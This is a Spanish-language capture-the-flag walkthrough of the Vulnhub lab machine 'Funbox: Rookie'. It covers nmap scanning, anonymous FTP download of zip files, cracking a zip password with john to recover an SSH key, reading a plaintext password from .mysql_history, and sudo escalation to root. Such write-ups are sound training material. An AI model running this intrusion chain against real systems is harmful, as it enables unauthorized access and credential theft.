+++
title = 'Funbox: Rookie - Vulnhub'
+++

[link => Funbox: Rookie](https://www.vulnhub.com/entry/funbox-rookie,520/#download)

---

## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/writeups/vulnhub/funboxrookie/nmaphd.png)


### La IP de la máquina objetivo es 10.38.1.35


## Escaneo de puertos en la máquina objetivo con nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.35 -oN target_scan.nmap
```

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target_scan.nmap
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Fri Jul 26 11:07:45 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN t
       │ arget_scan.nmap 10.38.1.35
   2   │ Nmap scan report for 10.38.1.35
   3   │ Host is up, received arp-response (0.000074s latency).
   4   │ Scanned at 2024-07-26 11:07:45 EDT for 3s
   5   │ Not shown: 65532 closed tcp ports (reset)
   6   │ PORT   STATE SERVICE REASON
   7   │ 21/tcp open  ftp     syn-ack ttl 64
   8   │ 22/tcp open  ssh     syn-ack ttl 64
   9   │ 80/tcp open  http    syn-ack ttl 64
  10   │ MAC Address: 08:00:27:1B:2A:22 (Oracle VirtualBox virtual NIC)
  11   │ 
  12   │ Read data files from: /usr/bin/../share/nmap
  13   │ # Nmap done at Fri Jul 26 11:07:48 2024 -- 1 IP address (1 host up) scanned in 3.13 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

### Puertos Abiertos: 21,22,80

## Ejecución de scripts con nmap

```bash
sudo nmap -sCV -p21,22,80 10.38.1.35 -oN scripts_exec.nmap
```

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: scripts_exec.nmap
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Fri Jul 26 11:12:54 2024 as: nmap -sCV -p21,22,80 -oN scripts_exec.nmap 10.38.1.35
   2   │ Nmap scan report for 10.38.1.35
   3   │ Host is up (0.00058s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     ProFTPD 1.3.5e
   7   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
   8   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
   9   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
  10   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
  11   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
  12   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
  13   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
  14   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
  15   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
  16   │ | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
  17   │ | -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
  18   │ | -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
  19   │ |_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
  20   │ 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  21   │ | ssh-hostkey: 
  22   │ |   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
  23   │ |   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
  24   │ |_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
  25   │ 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  26   │ | http-robots.txt: 1 disallowed entry 
  27   │ |_/logs/
  28   │ |_http-title: Apache2 Ubuntu Default Page: It works
  29   │ |_http-server-header: Apache/2.4.29 (Ubuntu)
  30   │ MAC Address: 08:00:27:1B:2A:22 (Oracle VirtualBox virtual NIC)
  31   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  32   │ 
  33   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  34   │ # Nmap done at Fri Jul 26 11:13:15 2024 -- 1 IP address (1 host up) scanned in 21.06 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Acceso a servidor FTP con usuario anonymous

```bash
kali :: Documents/vulnhub/funboxrookie » ftp 10.38.1.35                                      
Connected to 10.38.1.35.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:10.38.1.35]
Name (10.38.1.35:fafi): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@10.38.1.10 !
230-
230-The local time is: Fri Jul 26 15:16:48 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
229 Entering Extended Passive Mode (|||38415|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
```

## script en python para obtener todos los archivos del servidor FTP

```py
#####
# python3 ftp_get_files.py
#####

from ftplib import FTP

print("")

ftp = FTP('10.38.1.35','anonymous') 

print(ftp.login())

print("")

print("======================")
print("FILES")
print("======================\n")

files = ftp.nlst()

for file in files:
    print(file)
    with open(file, 'wb') as f:
        ftp.retrbinary(f'RETR {file}', f.write)
    
print("")
```

## Cracking de contraseña del archivo tom.zip con john 

```bash
kali :: Documents/vulnhub/funboxrookie » zip2john tom.zip > tomzip
```

```bash
kali :: Documents/vulnhub/funboxrookie » john tomzip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
iubire           (tom.zip/id_rsa)     
1g 0:00:00:00 DONE 2/3 (2024-07-26 12:40) 1.470g/s 62945p/s 62945c/s 62945C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## unzip tom.zip con contraseña iubire

```bash
kali :: Documents/vulnhub/funboxrookie » unzip tom.zip                     
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa                  
```

### Cambio de permisos de id_rsa y conexión vía ssh con usuario tom

```bash
kali :: Documents/vulnhub/funboxrookie » chmod 600 id_rsa

kali :: Documents/vulnhub/funboxrookie » ssh -i id_rsa tom@10.38.1.35
```

## Escalada de privilegios 

```bash
tom@funbox2:~$ ls -la
total 40
drwxr-xr-x 5 tom  tom  4096 Jul 25  2020 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom     6 Jul 25  2020 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Jul 25  2020 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
-rw-r--r-- 1 tom  tom     0 Jul 25  2020 .sudo_as_admin_successful
-rw------- 1 tom  tom     0 Jul 25  2020 .viminfo
```

### Contenido de archivo .mysql_history

```bash
tom@funbox2:~$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

#### *\040 es la representación octal de un espacio en blanco (32 en decimal)*

```bash
DEC	OCT	HEX	BIN		  Descripción

32	040	20	00100000  Espacio en blanco
```

```txt
================
Credenciales ↓↓↓
================

tom:xx11yy22!
```

```bash
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
tom@funbox2:~$ sudo su

root@funbox2:/home/tom# whoami
root
root@funbox2:/home/tom# cd /root
root@funbox2:~# ls
flag.txt
root@funbox2:~# cat flag.txt
   ____  __  __   _  __   ___   ____    _  __             ___ 
  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |
 / _/  / /_/ /  /    /  / _  |/ /_/ / _>  <             / __/ 
/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ 
           ____ ___  ___  / /_ ___  ___/ /       / /          
 _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           
(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            

```
